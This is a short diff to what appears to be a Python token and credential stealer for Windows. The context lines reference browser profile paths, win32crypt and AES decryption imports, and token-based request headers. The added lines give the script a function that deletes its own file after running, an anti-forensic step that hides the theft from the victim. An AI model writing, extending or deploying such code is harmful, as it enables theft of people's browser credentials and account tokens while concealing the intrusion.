@@ -8,6 +8,7 @@ import base64
 import win32crypt
 import datetime
 from Crypto.Cipher import AES
+import sys
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -35,6 +36,16 @@ PATHS = {
     'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
     'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
 }
+
+def delete_script():
+    """Supprime le fichier script après son exécution."""
+    try:
+        script_path = sys.argv[0]  
+        os.remove(script_path)  
+        print(f"Le script {script_path} a été supprimé avec succès.")
+    except Exception as e:
+        print(f"Erreur lors de la suppression du script : {e}")
+
 
 def getheaders(token=None):
     headers = {
@@ -192,3 +203,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    delete_script()
